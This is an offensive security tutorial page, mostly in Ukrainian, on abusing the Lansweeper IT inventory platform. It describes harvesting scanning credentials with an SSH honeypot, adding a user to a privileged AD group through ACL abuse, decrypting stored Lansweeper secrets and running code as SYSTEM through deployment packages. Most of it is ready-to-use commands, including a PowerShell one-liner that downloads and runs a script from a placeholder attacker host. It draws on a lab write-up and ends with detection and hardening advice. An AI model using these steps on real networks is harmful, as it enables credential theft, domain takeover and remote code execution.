# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper — платформа для виявлення та інвентаризації IT-активів, яка зазвичай розгортається на Windows та інтегрується з Active Directory. Облікові дані, налаштовані в Lansweeper, використовуються його скануючими рушіями для автентифікації на ресурсах через протоколи, як-от SSH, SMB/WMI та WinRM. Неправильні налаштування часто дозволяють:

- Перехоплення облікових даних шляхом перенаправлення Scanning Target на хост під контролем атакуючого (honeypot)
- Зловживання AD ACLs, які стають доступними через Lansweeper-related groups, щоб отримати віддалений доступ
- Розшифровку секретів, налаштованих у Lansweeper (connection strings і збережені scanning credentials), безпосередньо на хості
- Виконання коду на керованих кінцевих точках через функцію Deployment (часто під SYSTEM)

Ця сторінка узагальнює практичні робочі процеси та команди, щоб зловживати цими поведінками під час engagement.

## 1) Harvest scanning credentials via honeypot (SSH example)

Ідея: створити Scanning Target, що вказує на ваш хост, і прив’язати до нього існуючі Scanning Credentials. Коли скан запуститься, Lansweeper спробує автентифікуватися цими обліковими даними, а ваш honeypot зафіксує їх.

Огляд кроків (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Налаштуйте SSH порт на щось доступне (наприклад, 2022, якщо 22 заблоковано)
- Вимкніть розклад і плануйте запуск вручну
- Scanning → Scanning Credentials → переконайтесь, що існують Linux/SSH creds; зв’яжіть їх із новою ціллю (увімкніть всі за потреби)
- Натисніть “Scan now” на цілі
- Запустіть SSH honeypot і витягніть спроби введення username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Перевірте захоплені creds проти служб DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Примітки
- Працює аналогічно для інших протоколів, коли ви можете змусити сканер підключитися до вашого listener (SMB/WinRM honeypots, etc.). SSH часто найпростіший.
- Багато сканерів ідентифікують себе за відмінними client banners (e.g., RebexSSH) і намагаються виконати невинні команди (uname, whoami, etc.).

## 2) AD ACL abuse: отримати віддалений доступ, додавши себе до групи app-admin

Використовуйте BloodHound для перелічення ефективних прав скомпрометованого облікового запису. Типова знахідка — група, специфічна для сканера або додатку (e.g., “Lansweeper Discovery”), яка має GenericAll над привілейованою групою (e.g., “Lansweeper Admins”). Якщо привілейована група також є членом “Remote Management Users”, WinRM стає доступним після того, як ми додамо себе.

Приклади збору:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll у групі за допомогою BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Потім отримайте інтерактивний shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Порада: операції Kerberos чутливі до часу. Якщо ви отримаєте KRB_AP_ERR_SKEW, спочатку синхронізуйте час із DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Розшифрувати секрети, налаштовані в Lansweeper, на хості

На сервері Lansweeper сайт ASP.NET зазвичай зберігає зашифрований рядок підключення та симетричний ключ, що використовується додатком. За наявності відповідного локального доступу ви можете розшифрувати DB connection string і потім витягти збережені облікові дані сканування.

Типові розташування:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Використовуйте SharpLansweeperDecrypt, щоб автоматизувати розшифрування та дамп збережених облікових даних:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Очікуваний результат включає DB connection details та облікові дані сканера у відкритому тексті, такі як облікові записи Windows і Linux, що використовуються в межах інфраструктури. Часто вони мають підвищені локальні права на хостах домену:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Використовуйте відновлені Windows scanning creds для привілейованого доступу:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Як член групи “Lansweeper Admins”, веб-інтерфейс надає доступ до Deployment та Configuration. У розділі Deployment → Deployment packages ви можете створювати пакети, які виконують довільні команди на цільових assets. Виконання здійснює служба Lansweeper з високими привілеями, що дає можливість виконувати код від імені NT AUTHORITY\SYSTEM на вибраному хості.

High-level steps:
- Створіть новий Deployment package, який виконує PowerShell або cmd one-liner (reverse shell, add-user, etc.).
- Оберіть бажаний asset (наприклад, DC/host, де працює Lansweeper) та натисніть Deploy/Run now.
- Отримайте shell від імені SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Дії з розгортання шумні й залишають логи в Lansweeper та журналах подій Windows. Використовуйте з обачністю.

## Виявлення та зміцнення безпеки

- Обмежте або видаліть анонімну SMB-енумерацію. Моніторьте RID cycling та аномальний доступ до спільних ресурсів Lansweeper.
- Контроль вихідного трафіку: блокувати або жорстко обмежити вихідні SSH/SMB/WinRM з хостів сканера. Створюйте оповіщення про нестандартні порти (наприклад, 2022) та незвичні клієнтські банери на кшталт Rebex.
- Захистіть `Website\\web.config` та `Key\\Encryption.txt`. Виносьте секрети у vault і перевипускайте їх при компрометації. Розгляньте сервісні акаунти з мінімальними привілеями та gMSA там, де це можливо.
- AD-моніторинг: сповіщення про зміни у групах, пов'язаних з Lansweeper (наприклад, “Lansweeper Admins”, “Remote Management Users”), а також про зміни ACL, що надають GenericAll/Write членство в привілейованих групах.
- Аудит створення/змін/виконань Deployment-пакетів; оповіщення про пакети, які створюють cmd.exe/powershell.exe або несподівані вихідні підключення.

## Пов'язані теми
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
